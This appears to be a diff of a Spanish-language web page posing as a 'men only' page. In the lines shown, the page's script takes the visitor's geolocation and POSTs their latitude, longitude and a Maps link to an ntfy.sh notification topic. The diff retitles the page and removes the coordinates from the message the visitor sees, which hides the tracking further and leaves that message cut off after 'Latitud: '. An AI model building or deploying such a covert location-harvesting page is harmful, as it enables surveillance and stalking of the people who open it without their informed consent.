@@ -77,7 +77,7 @@
 </head>
 <body>
   <div class="content">
-    <h1>A</h1>
+    <h1>Cosas de hombres</h1>
     <p>Esta página es solo para hombres</p>
     <h2>¿Qué aprenderemos?</h2>
     <p>Ser hombre</p>
@@ -131,13 +131,13 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const maps = `https://maps.google.com/?q=${lat},${lon}`;
-            statusDiv.innerHTML += '<p>Eres hombre</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>Confirmado</p>';
+            statusDiv.innerHTML += '<p>Eres hombre</p><p>Latitud: ';
             // Enviar notificación a ntfy.sh
             fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
               method: "POST",
               body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
             }).then(() => {
-              statusDiv.innerHTML += '<p>sommos therians</p>';
+              statusDiv.innerHTML += '<p>somos therians</p>';
             }).catch(err => {
               statusDiv.innerHTML += '<p>Error al enviar notificación: ' + err.message + '</p>';
             });
